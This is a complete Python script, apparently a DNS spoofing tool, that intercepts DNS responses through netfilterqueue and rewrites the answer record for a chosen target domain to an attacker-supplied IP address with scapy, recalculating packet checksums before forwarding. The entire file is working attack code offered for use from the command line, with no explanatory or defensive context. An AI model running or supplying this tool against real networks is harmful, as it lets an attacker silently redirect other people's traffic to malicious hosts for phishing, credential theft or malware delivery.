import argparse
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # Decode qname to string
        if target_domain in qname:
            print(f"[+] Spoofing target: {qname}")
            answer = scapy.DNSRR(rrname=qname, rdata=spoofed_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def main():
    parser = argparse.ArgumentParser(description='DNS Spoofer script')
    parser.add_argument('target_domain', type=str, help='The target domain to spoof')
    parser.add_argument('spoofed_ip', type=str, help='The spoofed IP address')

    args = parser.parse_args()

    global target_domain
    global spoofed_ip
    target_domain = args.target_domain
    spoofed_ip = args.spoofed_ip

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == '__main__':
    main()

